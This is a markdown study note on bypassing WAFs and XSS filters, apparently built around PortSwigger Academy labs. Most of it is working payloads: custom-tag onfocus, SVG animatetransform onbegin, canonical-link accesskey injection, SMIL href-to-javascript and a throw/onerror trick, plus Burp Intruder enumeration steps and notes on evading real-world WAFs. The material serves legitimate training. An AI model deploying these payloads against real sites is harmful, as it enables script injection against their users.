# XSS — WAF and filter bypass

The application blocks known-dangerous tags (script, img, etc.) or event handlers. Find what's allowed via Intruder brute-force, then pick a payload that uses only permitted constructs: custom tags with `onfocus`/`tabindex`, SVG `<animatetransform onbegin>`, canonical link accesskeys, or SVG `<animate>` to set href without event handlers.

## Quick reference
```
# Most tags blocked — find allowed (Intruder + XSS cheat sheet tags list)
# body + onresize allowed:
<iframe src="https://LAB/?search=<body onresize=print()>" onload="this.style.width='100px'">

# All tags blocked except custom:
<xss id=x onfocus=alert(1) tabindex=1>#x
# deliver: location='https://LAB/?search=<xss id%3dx onfocus%3dalert(1) tabindex%3d1>#x'

# SVG markup allowed:
<svg><animatetransform onbegin=alert(1)>

# Canonical link tag (accesskey trigger):
?'accesskey='x'onclick='alert(1)    (Alt+Shift+X on Chrome)

# Event handlers blocked, href blocked:
<svg><a><animate attributeName=href values=javascript:alert(1)><text x=20 y=20>Click</text></a></svg>

# JS URL with chars blocked (no parens):
'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'
```

## Root cause
WAF/application filters block known dangerous tags and event handler names. But HTML5 has hundreds of tags and events, SVG adds animation elements with event hooks, and alternative attribute/delivery mechanisms (accesskeys, tabindex+focus, SMIL animations) aren't always in blocklists.

## Find it
1. Test a standard payload like `<img src=1 onerror=alert(1)>` — if blocked, WAF confirmed.
2. Use Burp Intruder with the XSS cheat sheet tags list to find allowed tags (responses that differ in length — allowed tags return a different status or length than blocked ones).
3. Re-run with allowed tag to find allowed events (use cheat sheet event list as payloads).
4. Build a payload using only allowed tag + event combinations.

## Technique
**Intruder setup for tag/event brute:**
1. Send the blocked request to Intruder.
2. Payload position: `<§img§>` (just the tag name).
3. Payload list: copy all tags from https://portswigger.net/web-security/cross-site-scripting/cheat-sheet (top right "Copy tags to clipboard").
4. Uncheck "URL-encode these characters" in payload encoding.
5. Run; sort by length — different length = allowed (WAF didn't block).
6. Note allowed tags. Repeat with `<body §onresize§=x>` (event position) using events list.

**Custom tags with onfocus:**
- Server blocks all known HTML tags but allows custom elements (`<xss>`, `<foo>`).
- `<xss id=x onfocus=alert(1) tabindex=1>#x` — tabindex makes it focusable; URL fragment `#x` auto-focuses the element on page load → `onfocus` fires.
- Deliver: `location='https://LAB/?search=<xss id%3dx onfocus%3dalert(1) tabindex%3d1>#x'`

**SVG animatetransform:**
- `<animatetransform>` inside SVG supports `onbegin` event (fires when animation starts).
- `<svg><animatetransform onbegin=alert(1)>` — animation begins immediately on load.

**Canonical link accesskey:**
- Input reflected into `<link rel="canonical" href="URL">`.
- Inject: `?'accesskey='x'onclick='alert(1)` into URL.
- Result: `<link rel="canonical" href="..." accesskey='x' onclick='alert(1)'>`
- Victim presses Alt+Shift+X (Chrome/Firefox on Linux) to trigger onclick.

**SVG animate (event handlers blocked):**
- `<animate attributeName=href values=javascript:alert(1)>` sets the parent `<a>` href to a JS URI via SMIL animation — no event handler attribute needed.
- Clicking the animated link executes JS.

**JS URL with blocked chars:**
- Input in a JS URL context; `(` and `)` not blocked, but space and other chars are.
- `throw/**/onerror=alert,1337` — uses `throw` to pass value to `onerror`; `/**/` replaces space; avoids calling alert as a function.

## Payload arsenal
```html
<!-- Most tags/events blocked: find allowed via Intruder -->
<body onresize=print()>
<iframe src="https://LAB/?search=<body onresize=print()>" onload="this.style.width='100px'">

<!-- All tags blocked except custom -->
<xss id=x onfocus=alert(1) tabindex=1>
<!-- deliver → force focus via #x fragment -->
location='https://LAB/?search=<xss id%3dx onfocus%3dalert(1) tabindex%3d1>#x'

<!-- SVG markup -->
<svg><animatetransform onbegin=alert(1)>
<svg><set onbegin=alert(1)>

<!-- Canonical link accesskey (trigger: Alt+Shift+X on Chrome) -->
?'accesskey='x'onclick='alert(1)

<!-- Event handlers and href blocked -->
<svg><a><animate attributeName=href values=javascript:alert(1)><text x=20 y=20>Click me</text></a></svg>

<!-- JS URL context, chars blocked -->
'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'
```

## Bypasses
| Defense | Bypass |
|---|---|
| `<script>`, `<img>` blocked | Use `<body onresize>`, `<svg>`, `<animatetransform onbegin>`, custom tags |
| All HTML tags blocked | Custom tag + onfocus + tabindex + #fragment auto-focus |
| Common events blocked | Intruder with full event list; `onbegin`, `onstart`, `onanimationstart` often missed |
| Event handlers blocked entirely | SVG `<animate attributeName=href values=javascript:...>` — no event attr needed |
| `(` `)` space blocked in JS | `throw/**/onerror=alert,1337` — uses throw instead of function call |

## Exploitation walkthrough
**Most tags blocked:** Intruder → find `<body>` and `onresize` are allowed → `<iframe src="LAB/?search=<body onresize=print()>" onload="this.style.width='100px'">` → deliver from exploit server.

**Custom tags only:** `<xss id=x onfocus=alert(1) tabindex=1>` → exploit server: `location='...?search=<xss id%3dx onfocus%3dalert(1) tabindex%3d1>#x'` → victim page auto-focuses #x element.

**SVG:** Intruder → `<svg>` and `<animatetransform>` allowed, `onbegin` allowed → `<svg><animatetransform onbegin=alert(1)>` → directly in search.

**Canonical:** visit `https://LAB/?'accesskey='x'onclick='alert(1)` → rendered in canonical link → Alt+Shift+X triggers.

**Event+href blocked:** `<svg><a><animate attributeName=href values=javascript:alert(1)><text x=20 y=20>Click</text></a></svg>` → SMIL animation sets href → click → alert.

**JS URL chars blocked:** `'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'` in postId → JS URL context → executes via throw→onerror.

## Chaining
- All WAF bypasses → [Exploiting-XSS](../Exploiting-XSS/) (weaponize any working execution vector)
- Custom tag XSS → requires victim interaction (click/hover) for some vectors → combined with social engineering

## Tools
- **Burp Intruder (Sniper)** — brute-force allowed tags and events; payload list from XSS cheat sheet; deselect "URL-encode" in encoding
- **Exploit server** — host delivery iframe/redirect for reflected XSS
- **XSS cheat sheet** — https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

## Labs

### Reflected XSS with most tags and attributes blocked [Practitioner]
Intruder brute finds `<body>` and `onresize` allowed. Deliver: `<iframe src="LAB/?search=<body onresize=print()>" onload="this.style.width='100px'">` from exploit server. Key insight: systematic brute-force reveals which tags/events are whitelisted.

### Reflected XSS with all tags blocked except custom ones [Practitioner]
Custom HTML tags allowed. `<xss id=x onfocus=alert(1) tabindex=1>#x` — tabindex makes element focusable; URL fragment auto-focuses; onfocus fires. Key insight: custom tags bypass HTML tag blocklists entirely.

### Reflected XSS with some SVG markup allowed [Practitioner]
Intruder finds `<svg>`, `<animatetransform>` allowed; `onbegin` event allowed. `<svg><animatetransform onbegin=alert(1)>` fires immediately. Key insight: SVG animation events are rarely in WAF blocklists.

### Reflected XSS in canonical link tag [Practitioner]
Input in canonical `<link>` URL. `?'accesskey='x'onclick='alert(1)` injects accesskey + onclick. Trigger: Alt+Shift+X. Key insight: attributes inside `<link>` tags (normally not user-interactable) can hold event handlers triggered by keyboard shortcuts.

### Reflected XSS with event handlers and href attributes blocked [Expert]
Event handlers and href blocked. SVG `<animate attributeName=href values=javascript:alert(1)>` sets parent anchor's href via SMIL animation. Click the animated text → alert. Key insight: SMIL `<animate>` modifies attributes dynamically without using event handler syntax.

### Reflected XSS in a JavaScript URL with some characters blocked [Expert]
Input in a JS URL context; space and some chars blocked. `'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'` — `throw` passes the value to `onerror` as an exception. Key insight: `throw expression` + `window.onerror=alert` achieves alert without calling `alert()` directly.

## Real-world notes
- WAF bypass is a permanent arms race — always enumerate allowed tags/events systematically rather than guessing.
- SVG SMIL animation (`<animate>`, `<animatetransform>`) is chronically under-blocked in real WAFs.
- `<xss>` custom tags exploit the fact that modern browsers are lenient with unknown elements — they render them as generic inline elements.
- Accesskey+onclick in canonical link tags is a vector that never appears in generic WAF signatures.

## References
- https://portswigger.net/web-security/cross-site-scripting/contexts#xss-in-html-tag-attributes
- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
